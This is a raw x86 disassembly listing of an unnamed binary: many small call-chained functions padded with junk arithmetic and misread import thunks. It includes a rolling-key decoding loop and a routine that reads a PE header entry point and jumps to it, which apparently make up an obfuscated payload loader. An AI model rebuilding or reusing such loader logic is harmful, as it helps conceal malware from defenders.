  4d076f:	jne    0x4d075e
  4d0771:	pop    edx
  4d0772:	add    esp,0x58
  4d0775:	pop    ebp
  4d0776:	ret    
  4d0777:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d077d:	sub    esp,0x28
  4d0780:	lea    ecx,ds:0x4d3130
  4d0786:	or     edi,DWORD PTR [ecx-0x48]
  4d0789:	push   ecx
  4d078a:	push   DWORD PTR [ecx+0x6c]
  4d078d:	push   DWORD PTR [ecx+0x94]
  4d0793:	push   DWORD PTR [ecx+0xc8]
  4d0799:	call   0x4d0ed4
  4d079e:	add    esp,0xc
  4d07a1:	pop    ecx
  4d07a2:	push   ecx
  4d07a3:	lea    esi,[ecx-0x130]
  4d07a9:	push   esi
  4d07aa:	call   0x4d1254
  4d07af:	add    esp,0x4
  4d07b2:	test   eax,eax
  4d07b4:	jne    0x4d07a3
  4d07b6:	pop    ecx
  4d07b7:	mov    edx,0x4d2008
  4d07bc:	mov    edx,DWORD PTR [edx]
  4d07be:	push   edx
  4d07bf:	push   DWORD PTR [ecx-0x130]
  4d07c5:	pop    edx
  4d07c6:	call   edx
  4d07c8:	add    esp,0x28
  4d07cb:	pop    ebp
  4d07cc:	ret    
  4d07cd:	add    BYTE PTR [eax],al
  4d07cf:	add    BYTE PTR [edi-0x1],bl
  4d07d2:	adc    eax,0x4d2090
  4d07d7:	call   edi
  4d07d9:	add    BYTE PTR [eax],al
  4d07db:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d07e1:	sub    esp,0x48
  4d07e4:	mov    esi,0x4d30c8
  4d07e9:	add    DWORD PTR [esi+0x114],edi
  4d07ef:	lea    edx,[esi-0xc8]
  4d07f5:	push   edx
  4d07f6:	call   0x4d1254
  4d07fb:	add    esp,0x4
  4d07fe:	test   eax,eax
  4d0800:	jne    0x4d07f0
  4d0802:	push   esi
  4d0803:	push   DWORD PTR [esi+0x10c]
  4d0809:	push   eax
  4d080a:	push   DWORD PTR [esi+0xd4]
  4d0810:	call   0x4d0ad0
  4d0815:	add    esp,0xc
  4d0818:	pop    esi
  4d0819:	push   0xfffffff4
  4d081b:	call   0x4d10cc
  4d0820:	add    esp,0x4
  4d0823:	add    esp,0x48
  4d0826:	pop    ebp
  4d0827:	ret    
  4d0828:	mov    edi,edi
  4d082a:	push   ebp
  4d082b:	mov    ebp,esp
  4d082d:	sub    esp,0x5c
  4d0830:	cmp    eax,0x2231
  4d0835:	jb     0x4d082b
  4d0837:	mov    ecx,0x4d30f0
  4d083c:	push   ecx
  4d083d:	mov    edx,0x6ac
  4d0842:	push   edx
  4d0843:	mov    ecx,0x6ac
  4d0848:	push   ecx
  4d0849:	mov    eax,0x40001
  4d084e:	push   eax
  4d084f:	mov    edx,0x8629857a
  4d0854:	push   DWORD PTR [edx+0x7a239a86]
  4d085a:	sub    DWORD PTR [esp],0x2
  4d085e:	mov    edx,0x4d2044
  4d0863:	pop    DWORD PTR [edx]
  4d0865:	call   0x4d130c
  4d086a:	add    esp,0x4
  4d086d:	xchg   DWORD PTR [esp],eax
  4d0870:	mov    ecx,eax
  4d0872:	pop    DWORD PTR [ecx-0xf0]
  4d0878:	mov    eax,DWORD PTR [ecx-0xf0]
  4d087e:	mov    esi,eax
  4d0880:	sub    edi,edi
  4d0882:	dec    edi
  4d0883:	and    edi,0x4d0014
  4d0889:	mov    ebx,0x8d9ae218
  4d088e:	xor    edx,edx
  4d0890:	add    edx,0x6ac
  4d0896:	cmp    edx,0x0
  4d0899:	je     0x4d08b7
  4d089b:	add    edx,0xfffffffc
  4d089e:	xor    eax,eax
  4d08a0:	push   DWORD PTR [edi+eax*1]
  4d08a3:	add    DWORD PTR [esp],ebx
  4d08a6:	pop    DWORD PTR [esi+eax*2]
  4d08a9:	dec    DWORD PTR [esi]
  4d08ab:	xor    ebx,ebx
  4d08ad:	add    ebx,DWORD PTR [edi]
  4d08af:	add    edi,0x4
  4d08b2:	add    esi,0x4
  4d08b5:	jmp    0x4d0896
  4d08b7:	push   ecx
  4d08b8:	call   0x4d0bd0
  4d08bd:	add    esp,0x4
  4d08c0:	pop    ecx
  4d08c1:	add    esp,0x5c
  4d08c4:	pop    ebp
  4d08c5:	ret    
  4d08c6:	add    BYTE PTR [eax],al
  4d08c8:	mov    edi,edi
  4d08ca:	push   ebp
  4d08cb:	mov    ebp,esp
  4d08cd:	sub    esp,0x24
  4d08d0:	lea    ecx,[edi-0x34]
  4d08d3:	xor    esi,0xffffffbf
  4d08d6:	push   ecx
  4d08d7:	mov    ebx,0x0
  4d08dc:	push   ebx
  4d08dd:	call   0x4d0e70
  4d08e2:	add    esp,0x4
  4d08e5:	pop    ecx
  4d08e6:	push   ecx
  4d08e7:	push   eax
  4d08e8:	push   edx
  4d08e9:	push   eax
  4d08ea:	call   0x4d118c
  4d08ef:	add    esp,0xc
  4d08f2:	pop    ecx
  4d08f3:	push   ecx
  4d08f4:	call   0x4d12b0
  4d08f9:	add    esp,0x4
  4d08fc:	pop    ecx
  4d08fd:	add    esp,0x24
  4d0900:	pop    ebp
  4d0901:	ret    
  4d0902:	add    BYTE PTR [eax],al
  4d0904:	mov    edi,edi
  4d0906:	push   ebp
  4d0907:	mov    ebp,esp
  4d0909:	sub    esp,0x30
  4d090c:	lea    edi,ds:0x4d3038
  4d0912:	or     edx,DWORD PTR [ebp-0xc]
  4d0915:	push   edi
  4d0916:	push   0xfffffff4
  4d0918:	call   0x4d10cc
  4d091d:	add    esp,0x4
  4d0920:	pop    edi
  4d0921:	push   edi
  4d0922:	push   DWORD PTR [edi+0xc]
  4d0925:	push   DWORD PTR [edi+0x4c]
  4d0928:	call   0x4d1118
  4d092d:	add    esp,0x8
  4d0930:	pop    edi
  4d0931:	push   edi
  4d0932:	push   0x0
  4d0934:	call   0x4d1048
  4d0939:	add    esp,0x4
  4d093c:	pop    edi
  4d093d:	add    esp,0x30
  4d0940:	pop    ebp
  4d0941:	ret    
  4d0942:	add    BYTE PTR [eax],al
  4d0944:	mov    edi,edi
  4d0946:	push   ebp
  4d0947:	mov    ebp,esp
  4d0949:	sub    esp,0x1c
  4d094c:	mov    edi,0x4d3198
  4d0951:	cmp    edi,0x21c0
  4d0957:	je     0x4d0947
  4d0959:	push   edi
  4d095a:	push   DWORD PTR [edi+0x1b0]
  4d0960:	push   eax
  4d0961:	push   DWORD PTR [edi+0x78]
  4d0964:	push   DWORD PTR [edi+0x1dc]
  4d096a:	call   0x4d0f94
  4d096f:	add    esp,0x10
  4d0972:	pop    edi
  4d0973:	push   edi
  4d0974:	call   0x4d0bd0
  4d0979:	add    esp,0x4
  4d097c:	pop    edi
  4d097d:	push   edi
  4d097e:	push   0x0
  4d0980:	call   0x4d1060
  4d0985:	add    esp,0x4
  4d0988:	pop    edi
  4d0989:	add    esp,0x1c
  4d098c:	pop    ebp
  4d098d:	ret    
  4d098e:	add    BYTE PTR [eax],al
  4d0990:	pop    edi
  4d0991:	call   DWORD PTR ds:0x4d205c
  4d0997:	call   edi
  4d0999:	add    BYTE PTR [eax],al
  4d099b:	add    BYTE PTR [edi-0x1],bl
  4d099e:	adc    eax,0x4d2028
  4d09a3:	call   edi
  4d09a5:	add    BYTE PTR [eax],al
  4d09a7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d09ad:	sub    esp,0x20
  4d09b0:	mov    eax,0x4d3150
  4d09b5:	sub    ecx,DWORD PTR [ebp-0x20]
  4d09b8:	push   eax
  4d09b9:	push   ecx
  4d09ba:	push   ebx
  4d09bb:	call   0x4d06ec
  4d09c0:	add    esp,0x8
  4d09c3:	pop    eax
  4d09c4:	push   eax
  4d09c5:	lea    esi,[eax-0x150]
  4d09cb:	push   esi
  4d09cc:	call   0x4d1254
  4d09d1:	add    esp,0x4
  4d09d4:	test   eax,eax
  4d09d6:	jne    0x4d09c5
  4d09d8:	pop    eax
  4d09d9:	push   eax
  4d09da:	mov    eax,0x0
  4d09df:	push   eax
  4d09e0:	call   0x4d0e70
  4d09e5:	add    esp,0x4
  4d09e8:	pop    eax
  4d09e9:	add    esp,0x20
  4d09ec:	pop    ebp
  4d09ed:	ret    
  4d09ee:	add    BYTE PTR [eax],al
  4d09f0:	mov    edi,edi
  4d09f2:	push   ebp
  4d09f3:	mov    ebp,esp
  4d09f5:	sub    esp,0x60
  4d09f8:	lea    eax,[esi+0x5c]
  4d09fb:	mov    ecx,edx
  4d09fd:	push   eax
  4d09fe:	push   0x0
  4d0a00:	call   0x4d0e70
  4d0a05:	add    esp,0x4
  4d0a08:	pop    eax
  4d0a09:	push   eax
  4d0a0a:	push   DWORD PTR [eax+0x1d4]
  4d0a10:	push   DWORD PTR [eax+0x8]
  4d0a13:	call   0x4d13b4
  4d0a18:	add    esp,0x8
  4d0a1b:	pop    eax
  4d0a1c:	push   eax
  4d0a1d:	call   0x4d115c
  4d0a22:	add    esp,0x4
  4d0a25:	pop    eax
  4d0a26:	add    esp,0x60
  4d0a29:	pop    ebp
  4d0a2a:	ret    
  4d0a2b:	add    BYTE PTR [edi-0x1],bl
  4d0a2e:	adc    eax,0x4d2054
  4d0a33:	call   edi
  4d0a35:	add    BYTE PTR [eax],al
  4d0a37:	add    BYTE PTR [edi-0x1],bl
  4d0a3a:	adc    eax,0x4d2078
  4d0a3f:	call   edi
  4d0a41:	add    BYTE PTR [eax],al
  4d0a43:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a49:	sub    esp,0x58
  4d0a4c:	mov    edi,0x4d3104
  4d0a51:	xor    eax,0xfffffffc
  4d0a54:	push   edi
  4d0a55:	mov    ebx,0x0
  4d0a5a:	push   ebx
  4d0a5b:	call   0x4d0a38
  4d0a60:	add    esp,0x4
  4d0a63:	pop    edi
  4d0a64:	push   edi
  4d0a65:	push   DWORD PTR [edi+0x68]
  4d0a68:	push   DWORD PTR [edi+0x170]
  4d0a6e:	push   eax
  4d0a6f:	call   0x4d0d50
  4d0a74:	add    esp,0xc
  4d0a77:	pop    edi
  4d0a78:	push   edi
  4d0a79:	push   0x0
  4d0a7b:	call   0x4d1260
  4d0a80:	add    esp,0x4
  4d0a83:	pop    edi
  4d0a84:	add    esp,0x58
  4d0a87:	pop    ebp
  4d0a88:	ret    
  4d0a89:	add    BYTE PTR [eax],al
  4d0a8b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a91:	sub    esp,0x44
  4d0a94:	mov    eax,0x4d3100
  4d0a99:	add    ebx,DWORD PTR [ebp-0x44]
  4d0a9c:	push   eax
  4d0a9d:	push   ecx
  4d0a9e:	push   ecx
  4d0a9f:	call   0x4d11d4
  4d0aa4:	add    esp,0x8
  4d0aa7:	pop    eax
  4d0aa8:	push   eax
  4d0aa9:	push   0x0
  4d0aab:	call   0x4d0fec
  4d0ab0:	add    esp,0x4
  4d0ab3:	pop    eax
  4d0ab4:	push   eax
  4d0ab5:	lea    eax,[eax-0x100]
  4d0abb:	push   eax
  4d0abc:	call   0x4d1254
  4d0ac1:	add    esp,0x4
  4d0ac4:	test   eax,eax
  4d0ac6:	jne    0x4d0ab5
  4d0ac8:	pop    eax
  4d0ac9:	add    esp,0x44
  4d0acc:	pop    ebp
  4d0acd:	ret    
  4d0ace:	add    BYTE PTR [eax],al
  4d0ad0:	mov    edi,edi
  4d0ad2:	push   ebp
  4d0ad3:	mov    ebp,esp
  4d0ad5:	sub    esp,0x28
  4d0ad8:	mov    ecx,0x4d3188
  4d0add:	xor    DWORD PTR [ecx+0x10],eax
  4d0ae0:	push   ecx
  4d0ae1:	push   ebx
  4d0ae2:	push   eax
  4d0ae3:	push   DWORD PTR [ecx+0x114]
  4d0ae9:	call   0x4d106c
  4d0aee:	add    esp,0xc
  4d0af1:	pop    ecx
  4d0af2:	push   ecx
  4d0af3:	mov    edx,0x0
  4d0af8:	push   edx
  4d0af9:	call   0x4d0a38
  4d0afe:	add    esp,0x4
  4d0b01:	pop    ecx
  4d0b02:	push   ecx
  4d0b03:	push   0x0
  4d0b05:	call   0x4d0a38
  4d0b0a:	add    esp,0x4
  4d0b0d:	pop    ecx
  4d0b0e:	add    esp,0x28
  4d0b11:	pop    ebp
  4d0b12:	ret    
  4d0b13:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b19:	sub    esp,0x58
  4d0b1c:	lea    eax,[edx+0x64]
  4d0b1f:	mov    DWORD PTR [ebp-0x34],edx
  4d0b22:	push   eax
  4d0b23:	call   0x4d0bd0
  4d0b28:	add    esp,0x4
  4d0b2b:	pop    eax
  4d0b2c:	push   eax
  4d0b2d:	push   DWORD PTR [eax+0x60]
  4d0b30:	push   DWORD PTR [eax+0x1a4]
  4d0b36:	push   ecx
  4d0b37:	call   0x4d10d8
  4d0b3c:	add    esp,0xc
  4d0b3f:	pop    eax
  4d0b40:	push   eax
  4d0b41:	call   0x4d115c
  4d0b46:	add    esp,0x4
  4d0b49:	pop    eax
  4d0b4a:	add    esp,0x58
  4d0b4d:	pop    ebp
  4d0b4e:	ret    
  4d0b4f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b55:	sub    esp,0x20
  4d0b58:	lea    edx,[edi+0x70]
  4d0b5b:	sub    DWORD PTR [edx-0x88],0xffffb0ff
  4d0b65:	push   edx
  4d0b66:	call   0x4d0bd0
  4d0b6b:	add    esp,0x4
  4d0b6e:	pop    edx
  4d0b6f:	push   edx
  4d0b70:	push   eax
  4d0b71:	push   ecx
  4d0b72:	call   0x4d0b14
  4d0b77:	add    esp,0x8
  4d0b7a:	pop    edx
  4d0b7b:	push   edx
  4d0b7c:	call   0x4d115c
  4d0b81:	add    esp,0x4
  4d0b84:	pop    edx
  4d0b85:	add    esp,0x20
  4d0b88:	pop    ebp
  4d0b89:	ret    
  4d0b8a:	add    BYTE PTR [eax],al
  4d0b8c:	mov    edi,edi
  4d0b8e:	push   ebp
  4d0b8f:	mov    ebp,esp
  4d0b91:	sub    esp,0x24
  4d0b94:	lea    esi,[eax+0x148]
  4d0b9a:	adc    DWORD PTR [ebp-0x18],0xffffc14a
  4d0ba1:	push   esi
  4d0ba2:	push   DWORD PTR [esi+0x1d4]
  4d0ba8:	push   eax
  4d0ba9:	push   edi
  4d0baa:	push   DWORD PTR [esi+0x1c4]
  4d0bb0:	call   0x4d09f0
  4d0bb5:	add    esp,0x10
  4d0bb8:	pop    esi
  4d0bb9:	push   0x0
  4d0bbb:	call   0x4d1260
  4d0bc0:	add    esp,0x4
  4d0bc3:	call   0x4d115c
  4d0bc8:	add    esp,0x4
  4d0bcb:	add    esp,0x24
  4d0bce:	pop    ebp
  4d0bcf:	ret    
  4d0bd0:	pop    edi
  4d0bd1:	call   DWORD PTR ds:0x4d2020
  4d0bd7:	call   edi
  4d0bd9:	add    BYTE PTR [eax],al
  4d0bdb:	add    BYTE PTR [edi-0x1],bl
  4d0bde:	adc    eax,0x4d20a0
  4d0be3:	call   edi
  4d0be5:	add    BYTE PTR [eax],al
  4d0be7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0bed:	sub    esp,0x28
  4d0bf0:	lea    ecx,ds:0x4d316c
  4d0bf6:	xor    DWORD PTR [ebp-0x20],edi
  4d0bf9:	push   ecx
  4d0bfa:	mov    eax,0x0
  4d0bff:	push   eax
  4d0c00:	call   0x4d0e70
  4d0c05:	add    esp,0x4
  4d0c08:	pop    ecx
  4d0c09:	push   ecx
  4d0c0a:	push   eax
  4d0c0b:	push   DWORD PTR [ecx+0x94]
  4d0c11:	push   ebx
  4d0c12:	push   DWORD PTR [ecx+0x1ec]
  4d0c18:	call   0x4d0904
  4d0c1d:	add    esp,0x10
  4d0c20:	pop    ecx
  4d0c21:	push   ecx
  4d0c22:	mov    esi,0x0
  4d0c27:	push   esi
  4d0c28:	call   0x4d0fec
  4d0c2d:	add    esp,0x4
  4d0c30:	pop    ecx
  4d0c31:	add    esp,0x28
  4d0c34:	pop    ebp
  4d0c35:	ret    
  4d0c36:	add    BYTE PTR [eax],al
  4d0c38:	pop    edi
  4d0c39:	call   DWORD PTR ds:0x4d2060
  4d0c3f:	call   edi
  4d0c41:	add    BYTE PTR [eax],al
  4d0c43:	add    BYTE PTR [edi-0x1],bl
  4d0c46:	adc    eax,0x4d2070
  4d0c4b:	call   edi
  4d0c4d:	add    BYTE PTR [eax],al
  4d0c4f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c55:	sub    esp,0x28
  4d0c58:	mov    eax,0x4d305c
  4d0c5d:	or     DWORD PTR [eax-0x50],0x7a
  4d0c61:	push   eax
  4d0c62:	push   0x0
  4d0c64:	call   0x4d0fec
  4d0c69:	add    esp,0x4
  4d0c6c:	pop    eax
  4d0c6d:	push   eax
  4d0c6e:	push   esi
  4d0c6f:	push   DWORD PTR [eax+0x44]
  4d0c72:	push   DWORD PTR [eax+0xb0]
  4d0c78:	call   0x4d1494
  4d0c7d:	add    esp,0xc
  4d0c80:	pop    eax
  4d0c81:	push   eax
  4d0c82:	lea    esi,[eax-0x5c]
  4d0c85:	push   esi
  4d0c86:	call   0x4d1254
  4d0c8b:	add    esp,0x4
  4d0c8e:	test   eax,eax
  4d0c90:	jne    0x4d0c82
  4d0c92:	pop    eax
  4d0c93:	add    esp,0x28
  4d0c96:	pop    ebp
  4d0c97:	ret    
  4d0c98:	mov    edi,edi
  4d0c9a:	push   ebp
  4d0c9b:	mov    ebp,esp
  4d0c9d:	sub    esp,0x30
  4d0ca0:	lea    eax,ds:0x4d3104
  4d0ca6:	and    DWORD PTR [ebp-0x24],0xffffa2b2
  4d0cad:	push   eax
  4d0cae:	mov    edi,0x0
  4d0cb3:	push   edi
  4d0cb4:	call   0x4d1060
  4d0cb9:	add    esp,0x4
  4d0cbc:	pop    eax
  4d0cbd:	push   eax
  4d0cbe:	push   ebx
  4d0cbf:	push   ebx
  4d0cc0:	push   edi
  4d0cc1:	push   DWORD PTR [eax+0x28]
  4d0cc4:	call   0x4d0828
  4d0cc9:	add    esp,0x10
  4d0ccc:	pop    eax
  4d0ccd:	push   eax
  4d0cce:	mov    ecx,0x0
  4d0cd3:	push   ecx
  4d0cd4:	call   0x4d0c44
  4d0cd9:	add    esp,0x4
  4d0cdc:	pop    eax
  4d0cdd:	add    esp,0x30
  4d0ce0:	pop    ebp
  4d0ce1:	ret    
  4d0ce2:	add    BYTE PTR [eax],al
  4d0ce4:	pop    edi
  4d0ce5:	call   DWORD PTR ds:0x4d202c
  4d0ceb:	call   edi
  4d0ced:	add    BYTE PTR [eax],al
  4d0cef:	add    BYTE PTR [edi-0x1],bl
  4d0cf2:	adc    eax,0x4d2064
  4d0cf7:	call   edi
  4d0cf9:	add    BYTE PTR [eax],al
  4d0cfb:	add    BYTE PTR [edi+0x2b],dl
  4d0cfe:	call   DWORD PTR [edi+0x57]
  4d0d01:	push   edi
  4d0d02:	push   edi
  4d0d03:	call   0x4d0bd0
  4d0d08:	sub    esp,0xfffffffc
  4d0d0b:	call   0x4d0f28
  4d0d10:	push   0x2
  4d0d12:	xor    eax,eax
  4d0d14:	sub    eax,0x4d3030
  4d0d19:	neg    eax
  4d0d1b:	push   0x0
  4d0d1d:	lea    ecx,[eax+0x7]
  4d0d20:	add    BYTE PTR [ecx],0x41
  4d0d23:	push   eax
  4d0d24:	call   0x4d130c
  4d0d29:	pop    edi
  4d0d2a:	pop    edi
  4d0d2b:	pop    edi
  4d0d2c:	lea    ecx,[eax+0x3b]
  4d0d2f:	mov    edi,DWORD PTR [ecx]
  4d0d31:	lea    eax,[eax+edi*1]
  4d0d34:	mov    eax,DWORD PTR [eax+0x28]
  4d0d37:	pusha  
  4d0d38:	mov    ah,0x45
  4d0d3a:	sub    al,ah
  4d0d3c:	ja     0x4d0778
  4d0d42:	popa   
  4d0d43:	ret    
  4d0d44:	pop    edi
  4d0d45:	call   DWORD PTR ds:0x4d209c
  4d0d4b:	call   edi
  4d0d4d:	add    BYTE PTR [eax],al
  4d0d4f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d55:	sub    esp,0x20
  4d0d58:	lea    esi,[edi-0x50]
  4d0d5b:	cmp    esi,0x7779
  4d0d61:	jbe    0x4d0d53
  4d0d63:	push   0x0
  4d0d65:	call   0x4d1174
  4d0d6a:	add    esp,0x4
  4d0d6d:	push   esi
  4d0d6e:	push   ebx
  4d0d6f:	push   edi
  4d0d70:	push   edx
  4d0d71:	call   0x4d0c98
  4d0d76:	add    esp,0xc
  4d0d79:	pop    esi
  4d0d7a:	call   0x4d115c
  4d0d7f:	add    esp,0x4
  4d0d82:	add    esp,0x20
  4d0d85:	pop    ebp
  4d0d86:	ret    
  4d0d87:	add    BYTE PTR [edi-0x1],bl
  4d0d8a:	adc    eax,0x4d208c
  4d0d8f:	call   edi
  4d0d91:	add    BYTE PTR [eax],al
  4d0d93:	add    BYTE PTR [edi-0x1],bl
  4d0d96:	adc    eax,0x4d206c
  4d0d9b:	call   edi
  4d0d9d:	add    BYTE PTR [eax],al
  4d0d9f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0da5:	sub    esp,0x20
  4d0da8:	mov    ebx,0x4d31e8
  4d0dad:	sbb    ecx,edx
  4d0daf:	push   ebx
  4d0db0:	push   DWORD PTR [ebx+0x110]
  4d0db6:	push   DWORD PTR [ebx+0x1f4]
  4d0dbc:	call   0x4d0a8c
  4d0dc1:	add    esp,0x8
  4d0dc4:	pop    ebx
  4d0dc5:	mov    ecx,0x0
  4d0dca:	push   ecx
  4d0dcb:	call   0x4d1260
  4d0dd0:	add    esp,0x4
  4d0dd3:	push   0x0
  4d0dd5:	call   0x4d1060
  4d0dda:	add    esp,0x4
  4d0ddd:	add    esp,0x20
  4d0de0:	pop    ebp
  4d0de1:	ret    
  4d0de2:	add    BYTE PTR [eax],al
  4d0de4:	mov    edi,edi
  4d0de6:	push   ebp
  4d0de7:	mov    ebp,esp
  4d0de9:	sub    esp,0x30
  4d0dec:	mov    edi,0x4d3078
  4d0df1:	sbb    eax,0xffffffc9
  4d0df4:	push   edi
  4d0df5:	push   ecx
  4d0df6:	push   DWORD PTR [edi+0x4c]
  4d0df9:	call   0x4d0da0
  4d0dfe:	add    esp,0x8
  4d0e01:	pop    edi
  4d0e02:	push   edi
  4d0e03:	push   0x0
  4d0e05:	call   0x4d0c44
  4d0e0a:	add    esp,0x4
  4d0e0d:	pop    edi
  4d0e0e:	push   edi
  4d0e0f:	mov    ecx,0x0
  4d0e14:	push   ecx
  4d0e15:	call   0x4d0a38
  4d0e1a:	add    esp,0x4
  4d0e1d:	pop    edi
  4d0e1e:	add    esp,0x30
  4d0e21:	pop    ebp
  4d0e22:	ret    
  4d0e23:	add    BYTE PTR [edi-0x1],bl
  4d0e26:	adc    eax,0x4d2098
  4d0e2b:	call   edi
  4d0e2d:	add    BYTE PTR [eax],al
  4d0e2f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e35:	sub    esp,0x38
  4d0e38:	lea    esi,ds:0x4d3130
  4d0e3e:	add    DWORD PTR [ebp-0x30],0x41
  4d0e42:	call   0x4d115c
  4d0e47:	add    esp,0x4
  4d0e4a:	push   esi
  4d0e4b:	push   ecx
  4d0e4c:	push   edi
  4d0e4d:	call   0x4d0728
  4d0e52:	add    esp,0x8
  4d0e55:	pop    esi
  4d0e56:	call   0x4d12b0
  4d0e5b:	add    esp,0x4
  4d0e5e:	add    esp,0x38
  4d0e61:	pop    ebp
  4d0e62:	ret    
  4d0e63:	add    BYTE PTR [edi-0x1],bl
  4d0e66:	adc    eax,0x4d2000
  4d0e6b:	call   edi
  4d0e6d:	add    BYTE PTR [eax],al
  4d0e6f:	add    BYTE PTR [edi-0x1],bl
  4d0e72:	adc    eax,0x4d2084
  4d0e77:	call   edi
  4d0e79:	add    BYTE PTR [eax],al
  4d0e7b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e81:	sub    esp,0x48
  4d0e84:	lea    ecx,[ebx-0xa0]
  4d0e8a:	add    DWORD PTR [ecx-0xf8],edi
  4d0e90:	push   ecx
  4d0e91:	mov    ebx,0x0
  4d0e96:	push   ebx
  4d0e97:	call   0x4d0fe0
  4d0e9c:	add    esp,0x4
  4d0e9f:	pop    ecx
  4d0ea0:	push   ecx
  4d0ea1:	push   edx
  4d0ea2:	push   DWORD PTR [ecx+0xd8]
  4d0ea8:	push   edi
  4d0ea9:	call   0x4d0944
  4d0eae:	add    esp,0xc
  4d0eb1:	pop    ecx
  4d0eb2:	push   ecx
  4d0eb3:	mov    ebx,0x0
  4d0eb8:	push   ebx
  4d0eb9:	call   0x4d0e70
  4d0ebe:	add    esp,0x4
  4d0ec1:	pop    ecx
  4d0ec2:	add    esp,0x48
  4d0ec5:	pop    ebp
  4d0ec6:	ret    
  4d0ec7:	add    BYTE PTR [edi-0x1],bl
  4d0eca:	adc    eax,0x4d2068
  4d0ecf:	call   edi
  4d0ed1:	add    BYTE PTR [eax],al
  4d0ed3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ed9:	sub    esp,0x40
  4d0edc:	mov    eax,0x4d3050
  4d0ee1:	adc    edx,0xffffffab
  4d0ee4:	push   eax
  4d0ee5:	push   esi
  4d0ee6:	push   edi
  4d0ee7:	call   0x4d0de4
  4d0eec:	add    esp,0x8
  4d0eef:	pop    eax
  4d0ef0:	push   eax
  4d0ef1:	push   0x0
  4d0ef3:	call   0x4d0c44
  4d0ef8:	add    esp,0x4
  4d0efb:	pop    eax
  4d0efc:	push   eax
  4d0efd:	push   0x0
  4d0eff:	call   0x4d0a38
  4d0f04:	add    esp,0x4
  4d0f07:	pop    eax
  4d0f08:	add    esp,0x40
  4d0f0b:	pop    ebp
  4d0f0c:	ret    
  4d0f0d:	add    BYTE PTR [eax],al
  4d0f0f:	add    BYTE PTR [edi-0x1],bl
  4d0f12:	adc    eax,0x4d201c
  4d0f17:	call   edi
  4d0f19:	add    BYTE PTR [eax],al
  4d0f1b:	add    BYTE PTR [edi-0x1],bl
  4d0f1e:	adc    eax,0x4d207c
  4d0f23:	call   edi
  4d0f25:	add    BYTE PTR [eax],al
  4d0f27:	add    BYTE PTR [edi-0x1],bl
  4d0f2a:	adc    eax,0x4d2048
  4d0f2f:	call   edi
  4d0f31:	add    BYTE PTR [eax],al
  4d0f33:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f39:	sub    esp,0x24
  4d0f3c:	mov    ebx,0x4d31c4
  4d0f41:	adc    esi,0xffffa34f
  4d0f47:	push   ebx
  4d0f48:	push   eax
  4d0f49:	push   DWORD PTR [ebx+0x88]
  4d0f4f:	push   DWORD PTR [ebx+0x80]
  4d0f55:	push   DWORD PTR [ebx+0xd4]
  4d0f5b:	call   0x4d0e7c
  4d0f60:	add    esp,0x10
  4d0f63:	pop    ebx
  4d0f64:	push   0x0
  4d0f66:	call   0x4d10b4
  4d0f6b:	add    esp,0x4
  4d0f6e:	lea    eax,[ebx-0x1c4]
  4d0f74:	push   eax
  4d0f75:	call   0x4d1254
  4d0f7a:	add    esp,0x4
  4d0f7d:	test   eax,eax
  4d0f7f:	jne    0x4d0f6f
  4d0f81:	add    esp,0x24
  4d0f84:	pop    ebp
  4d0f85:	ret    
  4d0f86:	add    BYTE PTR [eax],al
  4d0f88:	pop    edi
  4d0f89:	call   DWORD PTR ds:0x4d2010
  4d0f8f:	call   edi
  4d0f91:	add    BYTE PTR [eax],al
  4d0f93:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f99:	sub    esp,0x3c
  4d0f9c:	lea    edx,[edi+0x30]
  4d0f9f:	or     esi,DWORD PTR [ebp-0x30]
  4d0fa2:	push   edx
  4d0fa3:	mov    esi,0x0
  4d0fa8:	push   esi
  4d0fa9:	call   0x4d0fec
  4d0fae:	add    esp,0x4
  4d0fb1:	pop    edx
  4d0fb2:	push   edx
  4d0fb3:	push   DWORD PTR [edx+0xa4]
  4d0fb9:	push   DWORD PTR [edx+0x174]
  4d0fbf:	call   0x4d14e0
  4d0fc4:	add    esp,0x8
  4d0fc7:	pop    edx
  4d0fc8:	push   edx
  4d0fc9:	mov    eax,0x0
  4d0fce:	push   eax
  4d0fcf:	call   0x4d1260
  4d0fd4:	add    esp,0x4
  4d0fd7:	pop    edx
  4d0fd8:	add    esp,0x3c
  4d0fdb:	pop    ebp
  4d0fdc:	ret    
  4d0fdd:	add    BYTE PTR [eax],al
  4d0fdf:	add    BYTE PTR [edi-0x1],bl
  4d0fe2:	adc    eax,0x4d2038
  4d0fe7:	call   edi
  4d0fe9:	add    BYTE PTR [eax],al
  4d0feb:	add    BYTE PTR [edi-0x1],bl
  4d0fee:	adc    eax,0x4d2024
  4d0ff3:	call   edi
  4d0ff5:	add    BYTE PTR [eax],al
  4d0ff7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ffd:	sub    esp,0x60
  4d1000:	lea    edi,ds:0x4d31ec
  4d1006:	sbb    DWORD PTR [ebp-0x38],0xffffffc3
  4d100a:	push   edi
  4d100b:	push   0x0
  4d100d:	call   0x4d1048
  4d1012:	add    esp,0x4
  4d1015:	pop    edi
  4d1016:	push   edi
  4d1017:	push   DWORD PTR [edi+0x9c]
  4d101d:	push   DWORD PTR [edi+0x1f0]
  4d1023:	push   DWORD PTR [edi+0x80]
  4d1029:	push   ebx
  4d102a:	call   0x4d156c
  4d102f:	add    esp,0x10
  4d1032:	pop    edi
  4d1033:	push   edi
  4d1034:	mov    edi,0x0
  4d1039:	push   edi
  4d103a:	call   0x4d1174
  4d103f:	add    esp,0x4
  4d1042:	pop    edi
  4d1043:	add    esp,0x60
  4d1046:	pop    ebp
  4d1047:	ret    
  4d1048:	pop    edi
  4d1049:	call   DWORD PTR ds:0x4d2034
  4d104f:	call   edi
  4d1051:	add    BYTE PTR [eax],al
  4d1053:	add    BYTE PTR [edi-0x1],bl
